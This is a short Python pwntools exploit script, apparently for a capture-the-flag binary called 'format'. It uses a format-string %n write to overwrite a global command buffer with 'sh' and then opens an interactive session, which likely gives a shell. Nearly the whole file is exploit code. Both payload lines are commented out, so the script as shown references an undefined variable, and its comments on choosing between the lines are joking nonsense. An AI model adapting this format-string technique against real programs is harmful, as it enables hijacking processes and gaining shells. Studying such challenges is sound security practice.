#!/bin/python3
from pwn import *

p = process('./format')
context.terminal = ['alacritty', '-e']

gdb.attach(p, gdbscript='''

b*main+94
           c

           ''')
cmd_address = 0x404060

# you got 2 options here and they're both work
# the first line will work if you believe that your computer will be replaced by another in the next year 
# the second line will work if you believe that your computer is the most powerful computer in the world and it will never be replaced by another computer
# uncomment them if you want to use 1 of them 
#payload = F'%{0x006873}c%11$n'.encode()
#payload = F'%{0x26266873}c%11$n'.encode() 
payload = payload.ljust(0x18, b'\x00')
payload += p64(cmd_address)
p.sendlineafter(b'flag^^', payload)


p.interactive()

